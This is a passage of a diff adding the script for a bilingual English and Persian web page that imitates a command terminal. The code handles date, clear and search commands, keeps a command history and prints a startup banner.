+                             const localShamsi = new Intl.DateTimeFormat('fa-IR-u-ca-persian', { dateStyle: 'full', timeStyle: 'long', timeZone: 'Asia/Tehran' }).format(now);
+                             const dateOutput = `<b>Current Time (Jeddah):</b><br>${localGregorian}<br><br>` +
+                                    `<b>زمان فعلی (تهران):</b><br>${localShamsi}`;
+                            await printToTerminal(dateOutput, 'info', false);
+                            break;
+
+                        case 'clear':
+                        case 'پاک شود':
+                            output.innerHTML = '';
+                            break;
+                            
+                        case '':
+                            break;
+                        
+                        // Handle the 'search' command separately as it has arguments
+                        default:
+                            if (cmd === 'search') {
+                                if (args.length === 0) {
+                                    await printToTerminal("Usage: search <keyword>", 'error');
+                                } else {
+                                    const keyword = args.join(' ').toLowerCase();
+                                    let resultsFound = false;
+                                    const resultsOutput = [];
+                                    const sectionsToSearch = ['help-linux', 'help-windows', 'help-asm', 'help-reversing'];
+
+                                    await printToTerminal(`Searching for '${keyword}'...`, 'info', true);
+
+                                    for (const sectionId of sectionsToSearch) {
+                                        const sectionElement = document.getElementById(sectionId);
+                                        if (!sectionElement) continue;
+
+                                        const sectionTitle = sectionElement.querySelector('h3').textContent;
+                                        const items = sectionElement.querySelectorAll('.command-item');
+                                        const matchedItemsInSection = [];
+
+                                        items.forEach(item => {
+                                            if (item.textContent.toLowerCase().includes(keyword)) {
+                                                matchedItemsInSection.push(item.outerHTML);
+                                                resultsFound = true;
+                                            }
+                                        });
+
+                                        if (matchedItemsInSection.length > 0) {
+                                            resultsOutput.push(`<h3 style="color:var(--green); margin-top:10px;">--- Found in ${sectionTitle} ---</h3>` + matchedItemsInSection.join('<hr style="border-color: var(--comment);">'));
+                                        }
+                                    }
+
+                                    if (resultsFound) {
+                                        await printToTerminal(resultsOutput.join(''), 'output-line', false);
+                                    } else {
+                                        await printToTerminal(`No results found for '${keyword}'.`, 'error', true);
+                                    }
+                                }
+                            } else {
+                                await printToTerminal(`'${command}': command not found. Type 'help'.\nدستور شناسایی نشد. 'راهنما' را تایپ کنید.`, 'error', true);
+                            }
+                            break;
+                    }
+                }
+
+                isTyping = false;
+                toggleInput(true);
+            };
+            
+            
+            const toggleInput = (enable) => {
+                commandInput.disabled = !enable;
+                if (enable) {
+                    commandInput.focus();
+                    cursor.style.display = 'inline-block';
+                } else {
+                    commandInput.blur();
+                    cursor.style.display = 'none';
+                }
+            };
+            
+            commandInput.addEventListener('keydown', (e) => {
+                if (isTyping) { e.preventDefault(); return; }
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    const command = commandInput.value.trim();
+                    executeCommand(command);
+                    commandInput.value = '';
+                } else if (e.key === 'ArrowUp') {
+                    e.preventDefault();
+                    if (historyIndex < commandHistory.length - 1) {
+                        historyIndex++;
+                        commandInput.value = commandHistory[historyIndex];
+                    }
+                } else if (e.key === 'ArrowDown') {
+                    e.preventDefault();
+                    if (historyIndex > 0) {
+                        historyIndex--;
+                        commandInput.value = commandHistory[historyIndex];
+                    } else {
+                        historyIndex = -1;
+                        commandInput.value = '';
+                    }
+                }
+            });
+            
+            terminal.addEventListener('click', (e) => {
+                if(e.target === terminal || e.target === output) {
+                    if (!commandInput.disabled) commandInput.focus();
+                }
+            });
+
+            const initTerminal = async () => {
+                await printToTerminal('Initializing ...', 'info', true);
+                await printToTerminal('Loading advanced command modules... [OK]', 'info', true);
+                await printToTerminal('Welcome, خوش آمدید.', 'info', true);
+                
+                const asciiArt = document.getElementById('ascii-art').innerHTML;
+                await printToTerminal(asciiArt, 'output-line', false);
+                
+                await printToTerminal(document.getElementById('help-main').innerHTML, 'output-line', false);
+                
+                isTyping = false;
+                toggleInput(true);
+            };
+
+            initTerminal();
+        });
+    </script>
+</body>
+</html>
